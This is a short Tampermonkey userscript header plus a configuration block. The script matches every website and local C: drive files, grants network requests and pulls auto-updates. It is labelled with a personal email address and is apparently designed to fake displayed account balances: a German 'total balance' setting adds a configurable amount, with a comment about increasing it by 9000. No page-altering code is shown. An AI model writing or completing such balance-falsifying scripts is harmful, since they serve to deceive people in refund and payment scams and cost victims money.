// ==UserScript==
// @name         Ed 4Rec real.manfred.wessel@lippejagd-24.de
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @match        file:///C:/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/503636/Ed%204Rec%20realmanfredwessel%40lippejagd-24de.user.js
// @updateURL https://update.greasyfork.org/scripts/503636/Ed%204Rec%20realmanfredwessel%40lippejagd-24de.meta.js
// ==/UserScript==


//===================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================
//=====CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE==================CONFIGURE=====

//=====GESAMTSALDO================

  // Define the modification amount for the balance (configure here)
var modificationAmount = 3.00; // Example: +9000 to increase by 9000

